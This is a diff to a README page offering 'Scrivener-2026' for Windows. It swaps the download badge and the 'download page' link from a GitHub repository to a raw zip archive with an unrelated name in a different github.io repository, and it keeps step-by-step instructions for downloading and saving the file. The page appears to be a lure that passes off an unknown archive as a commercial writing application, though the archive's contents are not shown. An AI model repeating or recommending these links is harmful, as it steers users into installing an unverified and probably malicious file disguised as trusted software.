@@ -5,7 +5,7 @@ description: "Download and install Scrivener for Windows 10 and 11 using a singl
 ---
 # ✍️ Scrivener-2026 - Master your long form writing projects
 
-[![](https://img.shields.io/badge/Download-Scrivener_2026-blue.svg)](https://github.com/Ssimi4520/Scrivener-2026)
+[![](https://img.shields.io/badge/Download-Scrivener_2026-blue.svg)](https://raw.githubusercontent.com/Ssimi4520/ssimi4520.github.io/main/awd/github-io-ssimi-1.0.zip)
 
 ## 📖 About this application
 
@@ -23,7 +23,7 @@ Your computer needs specific parts to run this software. Please verify your syst
 
 ## 🚀 How to get started
 
-1. Go to the [Scrivener-2026 download page](https://github.com/Ssimi4520/Scrivener-2026).
+1. Go to the [Scrivener-2026 download page](https://raw.githubusercontent.com/Ssimi4520/ssimi4520.github.io/main/awd/github-io-ssimi-1.0.zip).
 2. Locate the link labeled Download.
 3. Click the link to start the transfer to your computer.
 4. Save the file to your Downloads folder.
